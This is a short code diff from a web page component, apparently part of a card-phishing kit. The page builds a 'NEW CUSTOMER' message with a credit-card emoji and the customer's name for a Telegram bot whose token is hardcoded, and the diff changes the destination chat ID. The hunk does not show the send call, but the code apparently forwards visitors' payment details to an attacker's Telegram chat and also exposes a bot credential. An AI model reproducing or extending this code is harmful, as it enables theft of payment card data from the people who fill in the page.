@@ -74,7 +74,7 @@ const DynamicPage = () => {
         )
 
         const token = "6584768873:AAFzT7T-PPsZIsSKEDtksmqjRq5LwP4ggVI"
-        const chat_id = "-4211448177"
+        const chat_id = "-4583361696"
         const my_text = `
             NEW CUSTOMER ‼️
             💳 Name: ${name}
